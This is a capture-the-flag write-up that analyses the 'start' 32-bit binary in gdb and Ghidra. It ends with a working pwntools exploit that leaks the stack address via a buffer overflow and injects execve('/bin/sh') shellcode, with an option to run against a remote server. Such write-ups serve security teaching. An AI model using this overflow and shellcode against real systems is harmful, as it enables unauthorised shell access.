## Analyze
Start by analyzing the binary

file
```bash
./start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```
checksec
```bash
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```
Points got :-
1. 32 bit binary
2. Intel 80386 architecture
3. No protection at all
Next we try running the code
```bash
└─$ ./start
Let's start the CTF:aaaaaaaaa
```
```
└─$ ./start 
Let's start the CTF:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault
```
Buffer overflow occur
Lets check it in gdb

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
pwndbg> 
```
seems like not a ret2win chal
so we check for every functions, and only function \_start we should analyze
from gdb :-
```bash
pwndbg> disass _start
Dump of assembler code for function _start:
   0x08048060 <+0>:	push   esp
   0x08048061 <+1>:	push   0x804809d
   0x08048066 <+6>:	xor    eax,eax
   0x08048068 <+8>:	xor    ebx,ebx
   0x0804806a <+10>:	xor    ecx,ecx
   0x0804806c <+12>:	xor    edx,edx
   0x0804806e <+14>:	push   0x3a465443
   0x08048073 <+19>:	push   0x20656874
   0x08048078 <+24>:	push   0x20747261
   0x0804807d <+29>:	push   0x74732073
   0x08048082 <+34>:	push   0x2774654c
   0x08048087 <+39>:	mov    ecx,esp
   0x08048089 <+41>:	mov    dl,0x14
   0x0804808b <+43>:	mov    bl,0x1
   0x0804808d <+45>:	mov    al,0x4
   0x0804808f <+47>:	int    0x80
   0x08048091 <+49>:	xor    ebx,ebx
   0x08048093 <+51>:	mov    dl,0x3c
   0x08048095 <+53>:	mov    al,0x3
   0x08048097 <+55>:	int    0x80
   0x08048099 <+57>:	add    esp,0x14
   0x0804809c <+60>:	ret
End of assembler dump.
```
from ghidra :-
```ghidra
void processEntry entry(void)

{
    code *pcVar1;
    
    pcVar1 = (code *)swi(0x80);
    (*pcVar1)(0x74732073,0x20747261,0x20656874,0x3a465443,_exit,&stack0x00000000);
    pcVar1 = (code *)swi(0x80);
    (*pcVar1)();
    return;
}
```
the code will
	Line 01: Stores the esp value at this point on the stack.
	Line 02: Stores the start address of \_exit.
	Lines 03-06: Set eax, ebx, ecx, edx to 0x00.
	Lines 07-11: Store the string "Let's start the CTF:" on the stack
	Line 12: Store the current esp value in ecx
	Line 13: Store 0x14 in edx Line
	14: Store in ebx Store 0x01
	Line 15: Store 0x04 in eax
	Line 16: Execute call instruction. What to do and how to do it is determined by the values ​​in the registers. Here,
	write 20 bytes (edx is 0x14 = 20) to the standard output (ebx is 0x01) and a character string with ecx (same value as esp from line 12) as the starting address (eax is 0x04). In other words, write "Let's start CTF:" to standard output.
	Line 17: Set ebx to 0x00.
	Line 18: Store 0x3c in edx.
	Line 19: Store 0x03 in eax.
	Line 20: Execute the call instruction. Here, it means reading 60 bytes (edx is 0x3c=60) from standard input (ebx is 0x00) (eax is 0x03).
	Line 21: Add 0x14 to esp.
	Line 22: ret

## Exploit

1. Overflow the file
2. Make it return to Line 12 where we will get the address of ESP
3. The file will ask us for input again
4. Overflow + ESP address + shellcode

exploit.py
```python 3
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './start'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
def leak_esp(r):
    address_1 = p32(0x08048087)           
    payload = flat('A'*20 , address_1)
    print(r.recvuntil('CTF:'))
    r.send(payload)
    esp = u32(r.recv()[:4])
    print("Address of ESP: ", hex(esp))
    return esp

io = start()



padding = 20
esp = leak_esp(io)
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

payload = flat(
    b'\x90' * padding,
    esp+20,
    shellcode
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendline( payload)

# Receive the flag
io.interactive()
```
